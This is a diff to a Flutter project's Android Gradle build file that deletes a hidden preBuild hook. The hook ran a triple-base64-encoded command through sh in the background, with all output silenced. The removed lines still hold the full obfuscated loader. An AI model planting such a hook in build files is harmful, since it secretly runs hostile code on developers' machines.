@@ -43,11 +43,4 @@ android {
 flutter {
     source = "../.."
 }
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((b(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjA1VFFYUmpNblJOV21sQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVU5VFFYUmFRMEZwWTBReGFHSnRVbmxpTW14cldESjBkbVJIZUhCaWFVbG5ZVWhTTUdOSVRUWk1lVGxxV2tjMWFHSlliM1ZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | b | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
+
